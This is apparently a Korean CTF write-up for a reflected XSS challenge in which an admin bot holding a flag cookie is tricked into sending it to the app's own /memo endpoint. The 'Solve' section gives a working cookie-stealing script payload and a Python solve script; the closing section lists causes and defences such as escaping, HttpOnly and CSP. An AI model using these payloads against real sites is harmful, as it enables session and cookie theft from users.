## xss_memo_leak

> 문제 설명: `/vuln` 엔드포인트에 Reflected XSS가 존재하고, `/flag`에 payload를 제출하면 서버 내부의 headless Chrome(admin bot)이 **`flag=FLAG` 쿠키를 가진 채** `/vuln?param=...`을 방문합니다. 외부로 나가는 webhook 없이, 같은 서버의 `/memo` 전역 변수를 이용해 쿠키를 탈취해야 하는 문제입니다.

### **취약점: Reflected XSS + 동일 오리진 데이터 유출 통로**

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param   # 필터링/이스케이프 없이 그대로 반환
```

`/flag`는 사용자가 입력한 `param`을 가지고, **FLAG를 쿠키 값으로 가진 bot**을 `/vuln`에 접속시킵니다.

```python
check_xss(param, {"name": "flag", "value": FLAG.strip()})
```

```python
driver.get("http://127.0.0.1:8000/")
driver.add_cookie(cookie)   # flag=FLAG 쿠키 실제 주입
driver.get(url)             # 쿠키 보유 상태로 /vuln 방문
```

따라서 `/vuln`에서 실행되는 스크립트는 `document.cookie`로 `flag=DH{...}` 값을 읽을 수 있습니다. 다만 외부 webhook 서버가 없으므로, **같은 서버의 `/memo` 엔드포인트(전역 변수 저장소)**를 탈취 통로로 사용합니다.

```python
memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"   # 누구나 쓰고 읽을 수 있는 전역 저장소
    return render_template("memo.html", memo=memo_text)
```

### Solve 😈

**`/flag`의 `param` payload**

```html
<script>
  document.location = "http://127.0.0.1:8000/memo?memo=" + document.cookie;
</script>
```

```python
import requests

base = "http://host:port"
payload = "<script>document.location='http://127.0.0.1:8000/memo?memo='+document.cookie</script>"

# 1. bot이 flag 쿠키를 들고 /vuln 방문 -> /memo로 쿠키 전달
requests.post(f"{base}/flag", data={"param": payload})

# 2. /memo에서 유출된 쿠키(FLAG 포함) 확인
r = requests.get(f"{base}/memo")
print(r.text)
```

**결과:** `memo_text`에 `flag=DH{...}` 형태로 FLAG 쿠키 값이 기록됨

### 근본 원인 및 방어법

- **원인**:
  - 사용자 입력(`param`)을 이스케이프 없이 그대로 응답에 반영 (Reflected XSS)
  - 민감한 값을 쿠키로 저장한 bot이 공격자 제어 하의 페이지를 방문
  - 외부 유출 서버가 없어도, **같은 애플리케이션 내 공개 쓰기/읽기 가능한 엔드포인트(`/memo`)**가 데이터 유출 경로로 악용됨
- **방어법**
  - 사용자 입력을 HTML에 반영할 때 반드시 이스케이프 처리 (예: Flask `escape()`, 템플릿 auto-escape 활용)
  - 민감한 쿠키에 `HttpOnly` 속성 부여 → `document.cookie`로 접근 자체를 차단
  - CSP(Content-Security-Policy) 적용으로 임의 스크립트 실행 및 외부/내부 리다이렉트 제한
  - 전역 상태를 아무나 쓰고 읽을 수 있는 엔드포인트(`/memo`) 설계 지양
